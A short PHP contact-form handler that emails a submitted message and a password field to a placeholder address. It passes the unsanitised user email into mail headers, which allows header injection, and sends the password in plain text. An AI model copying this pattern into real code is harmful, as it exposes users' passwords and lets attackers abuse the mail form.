<?php
$email = $_POST['email'];
$password = $_POST['contact_password'];
$message = $_POST['message'];

$to = "your-email@example.com";
$subject = "New Contact Message";
$fullMessage = "Message: $message\nPassword: $password";

$headers = "From: $email\r\n";
$headers .= "Reply-To: $email\r\n";

if (mail($to, $subject, $fullMessage, $headers)) {
  echo "Message sent!";
} else {
  echo "Error sending message.";
}
?>